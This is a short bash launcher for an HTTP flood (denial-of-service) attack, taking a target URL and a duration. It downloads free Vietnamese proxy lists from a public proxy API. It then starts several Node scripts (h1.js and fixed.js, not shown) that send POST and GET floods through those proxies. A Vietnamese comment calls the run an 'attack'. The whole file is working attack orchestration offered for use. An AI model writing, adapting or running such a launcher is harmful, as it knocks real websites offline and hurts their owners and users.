#!/bin/bash

[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1
URL=$1
TIME=$2

> live.txt
for t in http https; do
  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$t" >> live.txt
done

sort -u live.txt -o live.txt

# Start Node scripts
for m in POST GET; do
  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true || true &
  node fixed.js $URL $TIME 1 1 hihi.txt --verify true || true &
done
wait
# Đợi đúng thời gian attack trước khi exit
sleep $TIME
